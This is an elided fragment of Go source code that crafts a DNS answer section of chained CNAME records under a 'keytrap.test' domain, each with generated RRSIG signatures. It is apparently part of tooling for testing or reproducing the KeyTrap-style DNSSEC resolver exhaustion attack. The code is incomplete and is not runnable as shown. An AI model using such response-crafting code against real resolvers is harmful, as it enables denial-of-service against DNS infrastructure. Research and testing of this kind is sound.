 ...
 * 19/10/24 21:48      4stra       2.5.0       Altogether CNAME chain
 */
...
func craftAnswerSection() map[string][]layers.DNSResourceRecord {
	...
	for i := 0; i < cnameChainLength; i++ {
		...
		for j := i; j < cnameChainLength; j++ {
			section = append(
				section,
				[]layers.DNSResourceRecord{
					{
						Name:  []byte(fmt.Sprintf("cname%d.keytrap.test", j)),
						Type:  layers.DNSTypeCNAME,
						Class: layers.DNSClassIN,
						TTL:   uint32(globalTTLC),
						CNAME: []byte(fmt.Sprintf("cname%d.keytrap.test", j+1)),
					},
					GenRRSIG(
						[]layers.DNSResourceRecord{
							{
